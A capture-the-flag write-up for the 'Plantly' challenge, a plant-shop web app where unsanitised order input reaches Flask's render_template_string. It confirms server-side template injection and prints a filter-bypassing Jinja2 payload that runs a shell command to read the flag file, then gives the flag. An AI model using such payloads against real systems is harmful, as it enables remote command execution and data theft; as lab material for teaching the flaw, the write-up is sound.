# Plantly
![image](https://github.com/user-attachments/assets/28fe5509-c381-4cf6-ad85-bf12b63b0b34)

Attachment: [challenge.zip](https://github.com/LazyTitan33/CTF-Writeups/raw/refs/heads/main/SnykCon2025/attachments/plantly.zip)

## Writeup

I get a pretty website about plants:  

![image](https://github.com/user-attachments/assets/74c1ff9a-4ba0-4760-9c07-980529103767)

From the source code, I can already see the potential for SSTI as unsanitizied user input is passed to `render_template_string`:  

![image](https://github.com/user-attachments/assets/c9c2fdf5-cf9e-4f9a-9186-5c02ad48027f)

After registering an account and logging in, I place a custom order with the standard SSTI `{{7*7}}` payload:  

![image](https://github.com/user-attachments/assets/a9135ec0-a569-407c-b55f-54a6f085e309)

I go through the shopping flow and print out the receipt confirming SSTI:  

![image](https://github.com/user-attachments/assets/26e73620-03df-495e-be5a-68f0751738b3)

I have exploited SSTI plenty of times, so I had a [payload](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) ready that bypasses multiple types of filters:  

```text
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat /src/flag.txt')['read']()}}
```
![image](https://github.com/user-attachments/assets/1a485b28-4f0c-41ed-a6a3-bf8bd8b223d2)

flag{982e3b7286ee603d8539f987b65b90d4}
